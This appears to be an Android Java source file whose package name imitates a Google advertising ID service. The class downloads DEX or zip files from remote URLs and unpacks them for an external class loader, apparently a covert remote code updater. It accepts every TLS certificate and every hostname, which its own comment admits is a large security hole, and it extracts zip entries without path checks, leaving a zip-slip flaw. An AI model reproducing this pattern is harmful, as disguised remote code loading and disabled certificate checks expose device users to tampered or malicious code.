package com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.FilesLoader;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;

import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
import com.advertising_id_service.appclick.googleadvertisingidservice.REST.RestServicer;

import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.KeyStore;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.KeyManager;
import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;


public class FilesLoader {
    /*****************************************************************
     ********** Методы загрузки файла из внешнего источника **********
     *****************************************************************/
    public static String readInputStreamAsString(InputStream in)
            throws IOException {

        BufferedInputStream bis = new BufferedInputStream(in);
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        int result = bis.read();
        while(result != -1) {
            byte b = (byte)result;
            buf.write(b);
            result = bis.read();
        }
        return buf.toString();
    }

    TrustManager[] trustAllCerts = new TrustManager[]{
            new X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers(){return null;}
                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType){}
                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType){}
            }
    };

    private byte[] toByte(String hexString) {
        int len = hexString.length()/2;
        byte[] result = new byte[len];
        for (int i = 0; i < len; i++)
            result[i] = Integer.valueOf(hexString.substring(2*i, 2*i+2), 16).byteValue();
        return result;
    }

    public String downloadJson(String query) {
        int count;

        HttpsURLConnection connection = null;
        String res = "";
        try {
            URL url = new URL(query);
            String pass = new com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters().getPassToCert();
            KeyStore clientStore = KeyStore.getInstance("PKCS12");
            String cert = new com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters().getCert();
            InputStream is = new ByteArrayInputStream(toByte(cert));

            clientStore.load(is, pass.toCharArray());
            KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
            kmf.init(clientStore, pass.toCharArray());
            KeyManager[] kms = kmf.getKeyManagers();



            // TODO: Сделать по людски! Это решение - огромная дыра в безопасности:
            //       Этот метод надо бы перенести в NDK
            // см. https://developer.android.com/training/articles/security-ssl.html#CommonHostnameProbs
            //     https://stackoverflow.com/questions/6659360/how-to-solve-javax-net-ssl-sslhandshakeexception-error?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa
            //---------------------------------------------------------------------->
            HostnameVerifier hostnameVerifier = new HostnameVerifier() {
                @Override
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            };
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(kms, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            connection = (HttpsURLConnection) url.openConnection();
            connection.setHostnameVerifier(hostnameVerifier);
            //<----------------------------------------------------------------------

            connection.connect();
            long modified = connection.getLastModified();
            System.out.println(query + " " + connection.getResponseCode());
            int lengthOfFile = connection.getContentLength();
            InputStream in = connection.getInputStream();
            res = readInputStreamAsString(in);
            in.close();
            return res;
        } catch (Exception e) {
            System.out.println(query + " " + e.getMessage());
            return null;
        } finally {
            if (connection != null) connection.disconnect();
        }
    }


    private static int downloadBinaryFile(String query, File dest) {
        int count;

        OutputStream output;
        HttpURLConnection connection = null;
        try {
            URL url = new URL(query);
            connection = (HttpURLConnection) url.openConnection();
            connection.connect();

            long modified = connection.getLastModified();

            System.out.println(query + " " + connection.getResponseCode());
            // this will be useful so that you can show a tipical 0-100%
            // progress bar

            int lengthOfFile = connection.getContentLength();

            //LogKES.debug(query + " " + lenghtOfFile);

            byte[] buffer = new byte[1024];
            // download the file
            InputStream input = new BufferedInputStream(url.openStream(), buffer.length);

            // Output stream
            output = new FileOutputStream(dest);


            while ((count = input.read(buffer)) != -1) {
                output.write(buffer, 0, count);
                output.flush();
            }

            // flushing output
            output.flush();

            // closing streams
            output.close();
            input.close();

            dest.setLastModified(modified);

            if (dest.length() != lengthOfFile) {
                System.out.println(query + " -2");
                return -2;
            } else {
                System.out.println(query + " 0");
                return 0;
            }
        } catch (Exception e) {
            System.out.println(query + " " + e.getMessage());
            return -1;
        } finally {
            if (connection != null) connection.disconnect();
        }
    }

    public static void downloadDexFile(final Context cnt, final String url)
    {
        //TODO: А надо ли в отдельном потоке запускать, или пусть пользователи этой функции сами запускают её в отдельном потоке?
        AsyncTask.execute(new Runnable() {
            @Override
            public void run() {
                File file = null;
                //String filePath = ExternalLibServicer.getReleaseDexFilePath(cnt);
                String filePath = ExternalLibServicer.getDexFilePathZip(cnt);
                File tmpFile = new File(filePath);
                if(tmpFile.exists()) {
                    tmpFile.delete();
                }
                file = new File(filePath);
                downloadBinaryFile(url, file);
                unpackZip(GlobalParameters.getBasePath(cnt), GlobalParameters.DEX_DEFAULT_FILE_NAME_ZIP);
            }
        });
    }

//    public static void downloadReleaseDexFile(final Context cnt)
//    {
//        //TODO: А надо ли в отдельном потоке запускать, или пусть пользователи этой функции сами запускают её в отдельном потоке?
//        AsyncTask.execute(new Runnable() {
//            @Override
//            public void run() {
//                File file = null;
//                //String filePath = ExternalLibServicer.getReleaseDexFilePath(cnt);
//                String filePath = ExternalLibServicer.getDexFilePath(cnt);
//                File tmpFile = new File(filePath);
//                if(tmpFile.exists()) {
//                    tmpFile.delete();
//                }
//                file = new File(filePath);
//                downloadBinaryFile(GlobalParameters.URL_TO_DEX_FILE_RELEASE, file);
//            }
//        });
//    }
//
//    public static void downloadDebugDexFile(final Context cnt)
//    {
//        //TODO: А надо ли в отдельном потоке запускать, или пусть пользователи этой функции сами запускают её в отдельном потоке?
//        AsyncTask.execute(new Runnable() {
//            @Override
//            public void run() {
//                File file = null;
//                //String filePath = ExternalLibServicer.getDebugDexFilePath(cnt);
//                String filePath = ExternalLibServicer.getDexFilePath(cnt);
//                File tmpFile = new File(filePath);
//                if(tmpFile.exists()) {
//                    tmpFile.delete();
//                }
//                file = new File(filePath);
//                downloadBinaryFile(GlobalParameters.URL_TO_DEX_FILE_DEBUG, file);
//            }
//        });
//    }

    //Метод надо вызывать в отдельном потоке
    public static void downloadFile(final Context cnt, final String url, final String filePath)
    {
        File file = null;
        File tmpFile = new File(filePath);
        if(tmpFile.exists()) {
            tmpFile.delete();
        }
        file = new File(filePath);
        downloadBinaryFile(url, file);
    }

    public static void saveFile(final Context cnt, final String url, Boolean isNeedUnzip, String comment, String downloadID, final String path_to_zip, final String path_to_unzip, String unzip_name) {
        Boolean isFileDownloaded = true;
        Logger.log("Грузим файл из:" + url);
        String full_url = RestServicer.getUrlToDownloadFile(cnt, url, comment, downloadID);
Log.e("!!!-->", "full_url = " + full_url);
//   TODO:   RERPLACE!!!! ---> ЗАМЕНИТЬ!!! downloadFile(cnt, full_url, path_to_zip);
        downloadFile(cnt, url, path_to_zip); //<<<------------ на full_url
        if (isNeedUnzip) {
            isFileDownloaded = unpackZip(path_to_unzip, unzip_name);
        }
        if (isFileDownloaded)
        {
            //Отправляем лог на сервер что файл скачался
        }
    }

    public static boolean unpackZip(String path, String zipname)
    {
        Logger.log("Unzip file: " + path + zipname);
        InputStream is;
        ZipInputStream zis;
        try
        {
            String filename;
            is = new FileInputStream(path + zipname);
            zis = new ZipInputStream(new BufferedInputStream(is));
            ZipEntry ze;
            byte[] buffer = new byte[1024];
            int count;

            while ((ze = zis.getNextEntry()) != null)
            {
                // zapis do souboru
                filename = ze.getName();
                // Need to create directories if not exists, or
                // it will generate an Exception...
                if (ze.isDirectory()) {
                    File fmd = new File(path + filename);
                    fmd.mkdirs();
                    continue;
                }

                FileOutputStream fout = new FileOutputStream(path + filename);
                // cteni zipu a zapis
                while ((count = zis.read(buffer)) != -1)
                {
                    fout.write(buffer, 0, count);
                }
                fout.close();
                zis.closeEntry();
            }
            zis.close();
        }
        catch(IOException e)
        {
            Logger.log("" + e.getMessage());
            return false;
        }
        return true;
    }
}
